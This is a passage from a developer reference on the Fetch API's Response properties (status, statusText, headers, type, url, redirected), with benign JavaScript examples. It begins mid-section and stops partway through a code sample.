The `Response.ok` property is part of the core Fetch API specification and has broad browser support across all modern browsers. [Unverified: specific version numbers without checking current compatibility tables]

---

## Response.status and statusText

### Response.status

Response.status is a read-only property that contains the HTTP status code of the response, such as 200 for success or 404 when a resource cannot be found.

#### Data Type and Values

The property returns an unsigned short number representing one of the HTTP response status codes.

**Special Case - Zero Status:** A value of 0 is returned for responses whose type is opaque, opaqueredirect, or error. This occurs in specific scenarios:

- **Opaque responses**: Created when making cross-origin requests with mode set to no-cors, where the status property is set to 0, body is null, and headers are empty and immutable
- **Opaqueredirect responses**: Result from requests with redirect option set to manual that were redirected by the server, where status is 0, body is null, and headers are empty and immutable
- **Error responses**: Network errors where status is 0, body is null, headers are empty and immutable

#### Common Status Codes

HTTP status codes are organized into categories:

**2xx Success codes** indicate the request was fulfilled successfully **3xx Redirection codes** represent redirect responses **4xx Client error codes** indicate issues with the request **5xx Server error codes** indicate server-side problems

#### Usage Example

```javascript
const myImage = document.querySelector("img");
const myRequest = new Request("flowers.jpg");

fetch(myRequest)
  .then((response) => {
    console.log("response.status =", response.status); // 200
    return response.blob();
  })
  .then((myBlob) => {
    const objectURL = URL.createObjectURL(myBlob);
    myImage.src = objectURL;
  });
```

#### Response Validation Pattern

Since fetch only rejects on network failures, manual status validation is commonly needed:

```javascript
const getData = async () => {
  const response = await fetch('https://example.com/users');
  
  if (response.ok) {
    const data = await response.json();
    return data;
  } else {
    console.log('error: ', response.status, response.statusText);
    return {error: {status: response.status, statusText: response.statusText}};
  }
};
```

The `response.ok` property provides a boolean shorthand that checks whether the status code falls within the 200-299 range.

---

### Response.statusText

Response.statusText is a read-only property containing the status message corresponding to the HTTP status code in Response.status. Examples include "OK" for 200, "Continue" for 100, and "Not Found" for 404.

#### Data Type and Default Value

The property returns a String containing the HTTP status message associated with the response, with a default value of an empty string "".

#### HTTP/2 Limitation

**[Unverified] The behavior of statusText with HTTP/2 connections has cross-browser inconsistencies.**

HTTP/2 does not support status messages. According to the HTTP/2 specification, HTTP/2 does not define a way to carry the version or reason phrase included in an HTTP/1.1 status line.

Responses over an HTTP/2 connection will always have an empty string as status message in the specification, but different browsers implement this differently - Chrome returns an empty string, Firefox returns traditional status text like "OK" or "Not Found", and Safari returns "HTTP/2.0 200" or "HTTP/2.0 404".

This inconsistency has practical implications. Applications checking for specific statusText values like "OK" may fail when using HTTP/2 connections where statusText returns empty, requiring code changes or HTTP/2 disabling as a workaround.

#### Usage Example

```javascript
const myImage = document.querySelector("img");
const myRequest = new Request("flowers.jpg");

fetch(myRequest)
  .then((response) => {
    console.log("response.statusText =", response.statusText); // "OK"
    return response.blob();
  })
  .then((myBlob) => {
    const objectURL = URL.createObjectURL(myBlob);
    myImage.src = objectURL;
  });
```

#### Error Handling with statusText

Combining status and statusText provides more descriptive error information:

```javascript
fetch(url)
  .then((response) => {
    if (response.ok) {
      return response.json();
    }
    throw response;
  })
  .catch((error) => {
    if (error instanceof Error) {
      return { error };
    }
    return error.json().then((responseJson) => {
      return {
        error: new Error(
          `HTTP ${error.status} ${error.statusText}: ${responseJson.msg}`
        )
      };
    });
  });
```

#### Best Practices

**[Inference] Relying on statusText for application logic is problematic** due to:

- HTTP/2 returning empty strings in some browsers
- Cross-browser inconsistencies
- API servers potentially omitting or customizing status messages

**[Inference] For robust error handling, prefer checking response.status numerically or using response.ok** rather than comparing statusText string values. The statusText should be treated as supplementary information for logging and debugging, not as the primary mechanism for response validation.

---

## Response.headers

The `Response.headers` property returns a `Headers` object containing the HTTP headers associated with the response. This read-only property provides access to metadata about the response, including content type, caching directives, CORS headers, and custom server headers.

### Structure and Type

`Response.headers` returns a `Headers` object, which is an iterable collection of key-value pairs. The Headers interface provides methods to read, set, append, and delete header entries.

```javascript
const response = await fetch('https://api.example.com/data');
console.log(response.headers); // Headers {}
console.log(response.headers.constructor.name); // "Headers"
```

### Reading Header Values

#### get() Method

The `get()` method retrieves a single header value by name. Header names are case-insensitive. Returns `null` if the header doesn't exist.

```javascript
const response = await fetch('https://api.example.com/data');

const contentType = response.headers.get('Content-Type');
const cacheControl = response.headers.get('cache-control'); // case-insensitive
const customHeader = response.headers.get('X-Custom-Header');

console.log(contentType); // "application/json; charset=utf-8"
console.log(customHeader); // null if not present
```

#### has() Method

The `has()` method checks whether a header exists, returning a boolean. Useful for conditional logic based on header presence.

```javascript
if (response.headers.has('ETag')) {
  const etag = response.headers.get('ETag');
  // Store ETag for conditional requests
}

if (response.headers.has('X-RateLimit-Remaining')) {
  const remaining = response.headers.get('X-RateLimit-Remaining');
  console.log(`API calls remaining: ${remaining}`);
}
```

#### getSetCookie() Method

The `getSetCookie()` method returns an array of all `Set-Cookie` header values. This is necessary because `Set-Cookie` can appear multiple times in a response, and `get()` would only return the first value.

```javascript
const response = await fetch('https://api.example.com/login', {
  method: 'POST',
  credentials: 'include'
});

const cookies = response.headers.getSetCookie();
console.log(cookies);
// ['session=abc123; Path=/; HttpOnly', 'preferences=dark; Path=/']
```

### Iterating Over Headers

#### for...of Loop

Headers objects are iterable, allowing direct iteration over all header entries.

```javascript
const response = await fetch('https://api.example.com/data');

for (const [name, value] of response.headers) {
  console.log(`${name}: ${value}`);
}
// Output:
// content-type: application/json
// cache-control: max-age=3600
// etag: "33a64df551425fcc55e4d42a148795d9f25f89d4"
```

#### entries() Method

The `entries()` method returns an iterator of `[name, value]` pairs, functionally identical to using `for...of` directly on the Headers object.

```javascript
const response = await fetch('https://api.example.com/data');

for (const [name, value] of response.headers.entries()) {
  console.log(`${name}: ${value}`);
}
```

#### keys() Method

The `keys()` method returns an iterator of all header names.

```javascript
const response = await fetch('https://api.example.com/data');

for (const name of response.headers.keys()) {
  console.log(name);
}
// Output:
// content-type
// cache-control
// etag
```

#### values() Method

The `values()` method returns an iterator of all header values, without the corresponding names.

```javascript
const response = await fetch('https://api.example.com/data');

for (const value of response.headers.values()) {
  console.log(value);
}
// Output:
// application/json
// max-age=3600
// "33a64df551425fcc55e4d42a148795d9f25f89d4"
```

#### forEach() Method

The `forEach()` method executes a callback function for each header entry.

```javascript
const response = await fetch('https://api.example.com/data');

response.headers.forEach((value, name) => {
  console.log(`${name}: ${value}`);
});
```

### Converting Headers to Other Formats

#### Converting to Plain Object

```javascript
const response = await fetch('https://api.example.com/data');

const headersObject = Object.fromEntries(response.headers.entries());
console.log(headersObject);
// {
//   'content-type': 'application/json',
//   'cache-control': 'max-age=3600',
//   'etag': '"33a64df551425fcc55e4d42a148795d9f25f89d4"'
// }
```

#### Converting to Array

```javascript
const response = await fetch('https://api.example.com/data');

const headersArray = Array.from(response.headers.entries());
console.log(headersArray);
// [
//   ['content-type', 'application/json'],
//   ['cache-control', 'max-age=3600'],
//   ['etag', '"33a64df551425fcc55e4d42a148795d9f25f89d4"']
// ]
```

### Common Response Headers

#### Content Headers

**Content-Type**: Indicates the media type of the response body.

```javascript
const contentType = response.headers.get('Content-Type');
// "application/json; charset=utf-8"
// "text/html; charset=UTF-8"
// "image/png"
```

**Content-Length**: The size of the response body in bytes.

```javascript
const contentLength = response.headers.get('Content-Length');
console.log(`Response size: ${contentLength} bytes`);
```

**Content-Encoding**: The encoding applied to the response body (e.g., gzip, deflate).

```javascript
const encoding = response.headers.get('Content-Encoding');
// "gzip"
// "br" (Brotli)
```

**Content-Language**: The natural language(s) of the intended audience.

```javascript
const language = response.headers.get('Content-Language');
// "en-US"
// "fr-FR, en-US"
```

#### Caching Headers

**Cache-Control**: Directives for caching mechanisms.

```javascript
const cacheControl = response.headers.get('Cache-Control');
// "max-age=3600, public"
// "no-cache, no-store, must-revalidate"
// "private, max-age=0"
```

**ETag**: An identifier for a specific version of a resource.

```javascript
const etag = response.headers.get('ETag');
// "33a64df551425fcc55e4d42a148795d9f25f89d4"
// W/"0815" (weak ETag)

// Use for conditional requests
const conditionalResponse = await fetch(url, {
  headers: {
    'If-None-Match': etag
  }
});
```

**Expires**: The date/time after which the response is considered stale.

```javascript
const expires = response.headers.get('Expires');
// "Wed, 21 Oct 2024 07:28:00 GMT"
```

**Last-Modified**: The date/time when the resource was last modified.

```javascript
const lastModified = response.headers.get('Last-Modified');
// "Tue, 15 Oct 2024 12:45:26 GMT"

// Use for conditional requests
const conditionalResponse = await fetch(url, {
  headers: {
    'If-Modified-Since': lastModified
  }
});
```

#### CORS Headers

**Access-Control-Allow-Origin**: Indicates which origins can access the resource.

```javascript
const allowOrigin = response.headers.get('Access-Control-Allow-Origin');
// "*"
// "https://example.com"
```

**Access-Control-Allow-Methods**: Indicates which HTTP methods are allowed for CORS requests.

```javascript
const allowMethods = response.headers.get('Access-Control-Allow-Methods');
// "GET, POST, PUT, DELETE, OPTIONS"
```

**Access-Control-Allow-Headers**: Indicates which headers can be used in the actual request.

```javascript
const allowHeaders = response.headers.get('Access-Control-Allow-Headers');
// "Content-Type, Authorization, X-Custom-Header"
```

**Access-Control-Expose-Headers**: Indicates which headers can be exposed to the browser.

```javascript
const exposeHeaders = response.headers.get('Access-Control-Expose-Headers');
// "X-Total-Count, X-Page-Number"

// Without this header, custom headers won't be accessible
const totalCount = response.headers.get('X-Total-Count'); // null if not exposed
```

**Access-Control-Max-Age**: Indicates how long preflight request results can be cached.

```javascript
const maxAge = response.headers.get('Access-Control-Max-Age');
// "86400" (24 hours in seconds)
```

#### Authentication Headers

**WWW-Authenticate**: Indicates the authentication method that should be used.

```javascript
const authenticate = response.headers.get('WWW-Authenticate');
// "Basic realm=\"Access to API\""
// "Bearer realm=\"example\""
```

#### Rate Limiting Headers

Many APIs use custom headers for rate limiting information.

```javascript
const rateLimit = response.headers.get('X-RateLimit-Limit');
const rateRemaining = response.headers.get('X-RateLimit-Remaining');
const rateReset = response.headers.get('X-RateLimit-Reset');

console.log(`Rate limit: ${rateRemaining}/${rateLimit}`);
console.log(`Resets at: ${new Date(rateReset * 1000)}`);
```

#### Location Header

**Location**: Used in redirects to indicate the URL to redirect to.

```javascript
if (response.status === 301 || response.status === 302) {
  const location = response.headers.get('Location');
  console.log(`Redirected to: ${location}`);
}
```

### Practical Use Cases

#### Content Negotiation

```javascript
const response = await fetch('https://api.example.com/data', {
  headers: {
    'Accept': 'application/json'
  }
});

const contentType = response.headers.get('Content-Type');

if (contentType.includes('application/json')) {
  const data = await response.json();
  // Process JSON data
} else if (contentType.includes('text/html')) {
  const html = await response.text();
  // Process HTML
} else if (contentType.includes('text/csv')) {
  const csv = await response.text();
  // Process CSV
}
```

#### Implementing ETags for Caching

```javascript
// Store ETag from initial request
let cachedEtag = null;
let cachedData = null;

async function fetchWithETag(url) {
  const headers = {};
  
  if (cachedEtag) {
    headers['If-None-Match'] = cachedEtag;
  }
  
  const response = await fetch(url, { headers });
  
  if (response.status === 304) {
    console.log('Using cached data');
    return cachedData;
  }
  
  cachedEtag = response.headers.get('ETag');
  cachedData = await response.json();
  
  return cachedData;
}
```

#### Handling Pagination with Link Headers

```javascript
async function fetchAllPages(url) {
  const allData = [];
  let currentUrl = url;
  
  while (currentUrl) {
    const response = await fetch(currentUrl);
    const data = await response.json();
    allData.push(...data);
    
    const linkHeader = response.headers.get('Link');
    currentUrl = parseLinkHeader(linkHeader, 'next');
  }
  
  return allData;
}

function parseLinkHeader(header, rel) {
  if (!header) return null;
  
  const links = header.split(',');
  for (const link of links) {
    const [urlPart, relPart] = link.split(';');
    if (relPart && relPart.includes(`rel="${rel}"`)) {
      return urlPart.trim().slice(1, -1); // Remove < and >
    }
  }
  return null;
}
```

#### Detecting and Handling Rate Limits

```javascript
async function fetchWithRateLimit(url) {
  const response = await fetch(url);
  
  const remaining = parseInt(response.headers.get('X-RateLimit-Remaining'));
  const resetTime = parseInt(response.headers.get('X-RateLimit-Reset'));
  
  if (remaining === 0) {
    const waitTime = resetTime - Math.floor(Date.now() / 1000);
    console.warn(`Rate limit reached. Waiting ${waitTime} seconds...`);
    
    await new Promise(resolve => setTimeout(resolve, waitTime * 1000));
    return fetchWithRateLimit(url); // Retry after waiting
  }
  
  console.log(`API calls remaining: ${remaining}`);
  return response;
}
```

#### Content Security and Validation

```javascript
const response = await fetch('https://api.example.com/data');

// Check content type matches expectations
const contentType = response.headers.get('Content-Type');
if (!contentType || !contentType.includes('application/json')) {
  throw new Error(`Unexpected content type: ${contentType}`);
}

// Validate CORS headers for security
const allowOrigin = response.headers.get('Access-Control-Allow-Origin');
if (allowOrigin !== '*' && allowOrigin !== window.location.origin) {
  console.warn('CORS configuration may be restrictive');
}

// Check for security headers
const csp = response.headers.get('Content-Security-Policy');
const xFrameOptions = response.headers.get('X-Frame-Options');
const strictTransportSecurity = response.headers.get('Strict-Transport-Security');

console.log('Security headers present:', {
  csp: !!csp,
  xFrameOptions: !!xFrameOptions,
  hsts: !!strictTransportSecurity
});
```

#### Custom Header Extraction

```javascript
async function fetchWithMetadata(url) {
  const response = await fetch(url);
  const data = await response.json();
  
  // Extract all custom headers (typically prefixed with X-)
  const customHeaders = {};
  for (const [name, value] of response.headers) {
    if (name.toLowerCase().startsWith('x-')) {
      customHeaders[name] = value;
    }
  }
  
  return {
    data,
    metadata: {
      customHeaders,
      timestamp: response.headers.get('Date'),
      requestId: response.headers.get('X-Request-ID'),
      serverVersion: response.headers.get('X-API-Version')
    }
  };
}
```

### Header Name Case Sensitivity

Header names in the Headers object are case-insensitive. The Headers API normalizes all header names to lowercase.

```javascript
const response = await fetch('https://api.example.com/data');

// All of these return the same value
console.log(response.headers.get('Content-Type'));
console.log(response.headers.get('content-type'));
console.log(response.headers.get('CONTENT-TYPE'));
console.log(response.headers.get('CoNtEnT-TyPe'));

// When iterating, names are always lowercase
for (const [name, value] of response.headers) {
  console.log(name); // Always lowercase: "content-type", not "Content-Type"
}
```

### Immutability

The `Response.headers` object is immutable. You cannot modify the headers of a response after it has been created. Methods like `set()`, `append()`, and `delete()` are not available on response headers (they exist on the Headers interface for request headers).

```javascript
const response = await fetch('https://api.example.com/data');

// These methods don't exist on response.headers
// response.headers.set('X-Custom', 'value'); // TypeError
// response.headers.append('X-Custom', 'value'); // TypeError
// response.headers.delete('Content-Type'); // TypeError

// To work with modified headers, create a new Response
const modifiedResponse = new Response(response.body, {
  status: response.status,
  statusText: response.statusText,
  headers: new Headers({
    ...Object.fromEntries(response.headers),
    'X-Custom-Header': 'custom-value'
  })
});
```

### Headers in Opaque Responses

When making a no-cors request, the response is "opaque" and most headers are not accessible.

```javascript
const response = await fetch('https://external-api.com/data', {
  mode: 'no-cors'
});

console.log(response.type); // "opaque"
console.log(response.headers.get('Content-Type')); // null
console.log([...response.headers].length); // 0

// Only certain headers are exposed in opaque responses:
// - Cache-Control
// - Content-Language
// - Content-Type
// - Expires
// - Last-Modified
// - Pragma
```

### Performance Considerations

#### Lazy Evaluation

Headers are typically not parsed until accessed, making header retrieval efficient.

```javascript
// This is fast - headers aren't parsed yet
const response = await fetch('https://api.example.com/data');

// Headers are parsed on first access
const contentType = response.headers.get('Content-Type'); // Parsing occurs here
```

#### Caching Header Values

If you need to access the same header multiple times, cache the value to avoid repeated lookups.

```javascript
// Less efficient
function processResponse(response) {
  if (response.headers.get('Content-Type').includes('json')) {
    // ...
  }
  
  if (response.headers.get('Content-Type').includes('charset')) {
    // ...
  }
  
  console.log(response.headers.get('Content-Type'));
}

// More efficient
function processResponse(response) {
  const contentType = response.headers.get('Content-Type');
  
  if (contentType.includes('json')) {
    // ...
  }
  
  if (contentType.includes('charset')) {
    // ...
  }
  
  console.log(contentType);
}
```

### Debugging and Logging

#### Logging All Headers

```javascript
function logHeaders(response) {
  console.group('Response Headers');
  for (const [name, value] of response.headers) {
    console.log(`${name}: ${value}`);
  }
  console.groupEnd();
}

const response = await fetch('https://api.example.com/data');
logHeaders(response);
```

#### Creating a Headers Inspection Utility

```javascript
function inspectHeaders(response) {
  const headers = Object.fromEntries(response.headers);
  
  return {
    all: headers,
    content: {
      type: headers['content-type'],
      length: headers['content-length'],
      encoding: headers['content-encoding']
    },
    caching: {
      cacheControl: headers['cache-control'],
      etag: headers['etag'],
      expires: headers['expires'],
      lastModified: headers['last-modified']
    },
    cors: {
      allowOrigin: headers['access-control-allow-origin'],
      allowMethods: headers['access-control-allow-methods'],
      allowHeaders: headers['access-control-allow-headers'],
      exposeHeaders: headers['access-control-expose-headers']
    },
    custom: Object.entries(headers)
      .filter(([name]) => name.startsWith('x-'))
      .reduce((acc, [name, value]) => ({ ...acc, [name]: value }), {})
  };
}

const response = await fetch('https://api.example.com/data');
console.log(inspectHeaders(response));
```

### Edge Cases and Gotchas

#### Multiple Set-Cookie Headers

The standard `get()` method only returns the first `Set-Cookie` value. Always use `getSetCookie()` for cookies.

```javascript
const response = await fetch('https://api.example.com/login');

// Wrong - only gets first cookie
const cookie = response.headers.get('Set-Cookie'); // Only first cookie

// Correct - gets all cookies
const cookies = response.headers.getSetCookie(); // Array of all cookies
```

#### Forbidden Header Names

Certain headers cannot be set programmatically in requests, but they may appear in responses. These are controlled by the browser or server.

```javascript
const response = await fetch('https://api.example.com/data');

// These headers may be present in responses
console.log(response.headers.get('Set-Cookie')); // May be present
console.log(response.headers.get('Date')); // Typically present
console.log(response.headers.get('Server')); // May be present
```

#### Empty or Missing Headers

Always check for `null` when accessing headers that may not exist.

```javascript
const response = await fetch('https://api.example.com/data');

// Unsafe - may throw if header is missing
const etag = response.headers.get('ETag').replace(/"/g, ''); // Error if null

// Safe - checks for existence
const etag = response.headers.get('ETag');
if (etag) {
  const cleanEtag = etag.replace(/"/g, '');
  // Process etag
}

// Alternative with optional chaining
const cleanEtag = response.headers.get('ETag')?.replace(/"/g, '') ?? 'none';
```

---

## Response.type

The `Response.type` property is a read-only attribute that indicates the type of response based on how it was obtained and the nature of the request that generated it.

### Property Value

`Response.type` returns a string with one of the following values:

#### basic

A standard same-origin response where all headers are accessible and the response can be fully read. This occurs when:

- The request was made to the same origin as the requesting page
- No CORS violations occurred
- The response is from the same domain, protocol, and port

#### cors

A valid cross-origin response received with proper CORS headers. Characteristics:

- The request was made to a different origin
- The server responded with appropriate CORS headers (`Access-Control-Allow-Origin`, etc.)
- Only CORS-safelisted headers are exposed by default
- Additional headers require explicit exposure via `Access-Control-Expose-Headers`

#### opaque

A cross-origin response to a `no-cors` request. This type has severe restrictions:

- The response body is inaccessible (cannot be read)
- Headers are inaccessible (cannot be read)
- Status is always 0
- `ok` property is always false
- Used primarily for resources loaded for side effects (fonts, images in `<img>`, scripts)
- Still consumes cache space despite being unreadable

#### opaqueredirect

The response resulted from a request made with `redirect: "manual"` mode, and the server returned a redirect status (3xx). Characteristics:

- Status is always 0
- Headers are inaccessible
- Body is inaccessible
- Allows manual handling of redirects in Service Workers
- The redirect was not automatically followed

#### error

The response represents a network error. Characteristics:

- Status is 0
- `ok` is false
- Typically created via `Response.error()`
- Represents a failed fetch operation
- Cannot be created through normal fetch requests that fail (those reject the promise instead)

### Practical Implications

#### Security and Privacy

The `type` property enforces web security boundaries:

- **opaque** responses prevent cross-origin information leakage
- JavaScript cannot read the contents of `opaque` responses, preventing attacks
- This protects sensitive data from unauthorized access

#### Cache Behavior

Response types affect caching differently:

- **opaque** responses still occupy cache storage despite being unreadable
- Cache API stores opaque responses at their full size
- This can lead to quota issues if many opaque responses are cached

#### Service Worker Considerations

Response types are particularly relevant in Service Workers:

```javascript
self.addEventListener('fetch', event => {
  event.respondWith(
    fetch(event.request)
      .then(response => {
        // Check response type before caching
        if (response.type === 'opaque') {
          console.warn('Caching opaque response - uses quota but unreadable');
        }
        
        if (response.type === 'error') {
          return Response.error();
        }
        
        // Clone before caching since response can only be read once
        const responseToCache = response.clone();
        
        caches.open('my-cache').then(cache => {
          cache.put(event.request, responseToCache);
        });
        
        return response;
      })
  );
});
```

#### Header Access Patterns

Different response types allow different header access:

**basic**: All response headers accessible

```javascript
const response = await fetch('/same-origin/data');
console.log(response.type); // "basic"
console.log(response.headers.get('Content-Type')); // Accessible
console.log(response.headers.get('X-Custom-Header')); // Accessible
```

**cors**: Only CORS-safelisted or explicitly exposed headers

```javascript
const response = await fetch('https://api.example.com/data');
console.log(response.type); // "cors"
console.log(response.headers.get('Content-Type')); // Accessible (safelisted)
console.log(response.headers.get('X-Custom-Header')); // null unless exposed via CORS
```

**opaque**: No headers accessible

```javascript
const response = await fetch('https://third-party.com/resource', {
  mode: 'no-cors'
});
console.log(response.type); // "opaque"
console.log(response.headers.get('Content-Type')); // null
console.log(response.status); // 0
```

### Request Mode Interaction

The `Response.type` is determined by the request mode:

|Request Mode|Possible Response Types|
|---|---|
|`same-origin`|`basic`, `error`|
|`cors`|`basic`, `cors`, `error`|
|`no-cors`|`opaque`, `error`|
|`navigate`|`basic`, `cors`, `opaque`, `error`|

### Type Checking Patterns

#### Validating Response Types

```javascript
async function fetchWithTypeCheck(url, expectedType) {
  const response = await fetch(url);
  
  if (response.type !== expectedType) {
    console.warn(`Expected ${expectedType}, got ${response.type}`);
  }
  
  return response;
}
```

#### Conditional Processing

```javascript
async function processResponse(url) {
  const response = await fetch(url);
  
  switch(response.type) {
    case 'basic':
    case 'cors':
      // Can safely read response
      return await response.json();
      
    case 'opaque':
      // Cannot read - only useful for side effects
      console.log('Opaque response received - content unreadable');
      return null;
      
    case 'error':
      throw new Error('Network error occurred');
      
    default:
      console.warn(`Unexpected response type: ${response.type}`);
      return null;
  }
}
```

### Common Pitfalls

#### Attempting to Read Opaque Responses

```javascript
// This will fail
const response = await fetch('https://external.com/api', { mode: 'no-cors' });
console.log(response.type); // "opaque"
const data = await response.json(); // TypeError: Body is unusable
```

#### Caching Opaque Responses Excessively

```javascript
// Problematic: fills cache with unreadable responses
self.addEventListener('fetch', event => {
  if (event.request.url.includes('third-party')) {
    event.respondWith(
      caches.match(event.request).then(cached => {
        if (cached) return cached;
        
        return fetch(event.request, { mode: 'no-cors' }).then(response => {
          // response.type is 'opaque' - takes up cache space but unreadable
          caches.open('external').then(cache => {
            cache.put(event.request, response.clone());
          });
          return response;
        });
      })
    );
  }
});
```

#### Not Handling Error Types

```javascript
// Better error handling
try {
  const response = await fetch(url);
  
  if (response.type === 'error') {
    throw new Error('Network request failed');
  }
  
  if (!response.ok) {
    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
  }
  
  return await response.json();
} catch (error) {
  console.error('Fetch failed:', error);
  throw error;
}
```

### Immutability

The `Response.type` property is immutable and set when the Response object is created. It cannot be modified:

```javascript
const response = await fetch('/api/data');
console.log(response.type); // "basic"

// This has no effect
response.type = 'cors'; // TypeError or silently fails in strict mode
console.log(response.type); // Still "basic"
```

### Cloning Behavior

When cloning a Response, the type is preserved:

```javascript
const original = await fetch('/data');
console.log(original.type); // "basic"

const cloned = original.clone();
console.log(cloned.type); // "basic" - same as original
```

### Constructed Responses

When manually constructing Response objects, the type defaults to `default`:

```javascript
const constructed = new Response('{"data": "value"}', {
  headers: { 'Content-Type': 'application/json' }
});

console.log(constructed.type); // "default" (not in the standard type list above)
```

[Inference] The `default` type likely behaves similarly to `basic` in terms of accessibility, though this is an implementation detail that may vary across browsers.

---

## Response.url

The `Response.url` property returns the final URL of the response after following any redirects. This is a read-only property that contains the URL from which the response was ultimately retrieved.

### Core Behavior

The `url` property reflects the final destination URL after the browser has completed any HTTP redirects (301, 302, 307, 308, etc.). If you fetch `https://example.com/old-page` which redirects to `https://example.com/new-page`, the `Response.url` will be `https://example.com/new-page`.

```javascript
const response = await fetch('https://example.com/redirect');
console.log(response.url); // Final URL after redirects
```

### URL Fragments Handling

**[Unverified]** URL fragments (the hash portion after `#`) are typically stripped from the `Response.url` property. If you fetch `https://example.com/page#section`, the `Response.url` will likely contain `https://example.com/page` without the fragment identifier, as fragments are client-side only and not sent to the server.

### Redirect Mode Interaction

The `Response.url` behavior interacts with the `redirect` option in the fetch request:

- **`redirect: 'follow'` (default)**: `Response.url` contains the final URL after all redirects
- **`redirect: 'manual'**: Returns an opaque redirect response;` Response.url` will be an empty string
- **`redirect: 'error'**: Throws a` TypeError` if a redirect occurs, so you won't get a Response object

```javascript
// Manual redirect handling
const response = await fetch('https://example.com/redirect', {
  redirect: 'manual'
});
console.log(response.url); // Empty string
console.log(response.type); // 'opaqueredirect'
```

### URL Resolution

The URL is always an absolute URL, even if you made the fetch request with a relative URL. The browser resolves relative URLs against the document's base URL before making the request.

```javascript
// If current page is https://example.com/folder/page.html
const response = await fetch('../data.json');
console.log(response.url); // 'https://example.com/data.json'
```

### Cross-Origin Scenarios

For same-origin requests, `Response.url` always contains the complete final URL. For cross-origin requests with CORS, the `Response.url` property still reflects the actual URL of the response, including any cross-origin redirects that occurred.

```javascript
// Cross-origin request
const response = await fetch('https://api.example.com/data');
console.log(response.url); // 'https://api.example.com/data' or final redirect destination
```

### Opaque Responses

For opaque responses (no-cors mode for cross-origin requests), the `Response.url` will be an empty string:

```javascript
const response = await fetch('https://other-domain.com/image.jpg', {
  mode: 'no-cors'
});
console.log(response.url); // Empty string
console.log(response.type); // 'opaque'
```

### Service Worker Considerations

When a Service Worker intercepts a fetch request and returns a synthetic response using `new Response()`, the `url` property of that response can be set explicitly:

```javascript
// Inside a service worker
self.addEventListener('fetch', event => {
  event.respondWith(
    new Response('Custom content', {
      headers: { 'Content-Type': 'text/plain' }
    })
  );
});
```

**[Inference]** The synthetic response's `url` property would likely reflect the request URL or be empty depending on how the Service Worker constructs it.

### Practical Use Cases

**Detecting redirects:**

```javascript
const requestedUrl = 'https://example.com/short-link';
const response = await fetch(requestedUrl);

if (response.url !== requestedUrl) {
  console.log(`Redirected from ${requestedUrl} to ${response.url}`);
}
```

**Validating final destination:**

```javascript
const response = await fetch('https://example.com/download');

// Check if we ended up at expected domain
const finalUrl = new URL(response.url);
if (finalUrl.hostname !== 'cdn.example.com') {
  console.warn('Unexpected redirect destination');
}
```

**Building resource maps:**

```javascript
async function fetchResources(urls) {
  const resourceMap = new Map();
  
  for (const url of urls) {
    const response = await fetch(url);
    resourceMap.set(response.url, await response.text());
  }
  
  return resourceMap;
}
```

### Immutability

The `Response.url` property is read-only and cannot be modified after the Response object is created. This ensures the integrity of the response metadata.

### Type Information

The property returns a `USVString` (a string containing Unicode scalar values), which in JavaScript is effectively a standard string type. The string will always be a valid URL or an empty string in specific cases (opaque responses, manual redirects).

---

## Response.redirected

The `Response.redirected` property is a read-only boolean that indicates whether the response is the result of a request that was redirected. It returns `true` if the final URL differs from the initial request URL after following one or more HTTP redirects.

### Property Characteristics

**Type**: Boolean (read-only)

**Returns**:

- `true` - The response resulted from a redirect (one or more 3xx status codes followed)
- `false` - The response was retrieved directly without redirection

### How Redirects Work with Fetch

By default, the Fetch API follows redirects automatically using the `follow` redirect mode. The `redirected` property allows you to detect when this automatic following has occurred.

```javascript
const response = await fetch('https://example.com/old-page');
console.log(response.redirected); // true if redirected, false otherwise
```

### Redirect Detection Scenarios

The property becomes `true` in these situations:

1. **301 Moved Permanently** - Resource has permanently moved to a new URL
2. **302 Found** - Temporary redirect to another URL
3. **303 See Other** - Response can be found at another URL using GET
4. **307 Temporary Redirect** - Temporary redirect, method and body preserved
5. **308 Permanent Redirect** - Permanent redirect, method and body preserved

### Accessing the Final URL

When a redirect occurs, you can access the final URL through `response.url`:

```javascript
const response = await fetch('https://example.com/redirect-me');

if (response.redirected) {
  console.log('Original URL: https://example.com/redirect-me');
  console.log('Final URL:', response.url);
  console.log('Was redirected:', response.redirected);
}
```

### Practical Use Cases

#### Security Validation

Verify that requests haven't been redirected to unexpected domains:

```javascript
async function fetchWithRedirectCheck(url) {
  const response = await fetch(url);
  
  if (response.redirected) {
    const originalDomain = new URL(url).hostname;
    const finalDomain = new URL(response.url).hostname;
    
    if (originalDomain !== finalDomain) {
      console.warn('Cross-domain redirect detected');
      console.warn(`From: ${originalDomain}`);
      console.warn(`To: ${finalDomain}`);
    }
  }
  
  return response;
}
```

#### Logging and Analytics

Track redirect behavior for monitoring purposes:

```javascript
async function fetchWithLogging(url) {
  const startTime = performance.now();
  const response = await fetch(url);
  const endTime = performance.now();
  
  const logEntry = {
    originalUrl: url,
    finalUrl: response.url,
    wasRedirected: response.redirected,
    status: response.status,
    duration: endTime - startTime
  };
  
  if (response.redirected) {
    console.log('Redirect occurred:', logEntry);
  }
  
  return response;
}
```

#### Conditional Processing

Handle redirected responses differently:

```javascript
async function fetchResource(url) {
  const response = await fetch(url);
  
  if (response.redirected) {
    // Handle redirected response
    console.log('Resource moved to:', response.url);
    // Potentially update cached URLs, notify user, etc.
  }
  
  return await response.json();
}
```

### Interaction with Redirect Modes

The `redirect` option in fetch controls redirect behavior:

```javascript
// Default: follow redirects automatically
fetch(url, { redirect: 'follow' });

// Error on redirect
fetch(url, { redirect: 'error' })
  .catch(err => console.log('Redirect blocked'));

// Manual mode: get redirect response without following
fetch(url, { redirect: 'manual' });
```

**Important**: When using `redirect: 'manual'`, the response object will have `type: 'opaqueredirect'` and `redirected` will be `false` because the redirect wasn't actually followed.

### Redirect Chains

The property only indicates whether _any_ redirect occurred, not how many:

```javascript
// URL chain: /a → /b → /c → /d
const response = await fetch('/a');
console.log(response.redirected); // true
console.log(response.url); // '/d' (final destination)
```

[Inference] The browser follows the entire redirect chain internally, but the Fetch API doesn't expose intermediate URLs in the chain—only the final destination is accessible via `response.url`.

### CORS Considerations

Cross-origin redirects have additional constraints:

```javascript
// Request to domain A redirects to domain B
const response = await fetch('https://domain-a.com/resource');

if (response.redirected) {
  // Both domain A and domain B must have proper CORS headers
  // Otherwise, the fetch will fail
}
```

The redirect chain must maintain CORS compliance at each step. If any intermediate server doesn't provide appropriate CORS headers, the entire request fails.

### Distinguishing from Manual Redirects

Compare automatic redirects with manual client-side navigation:

```javascript
async function handlePotentialRedirect(url) {
  const response = await fetch(url);
  
  if (response.redirected) {
    // Automatic HTTP redirect occurred
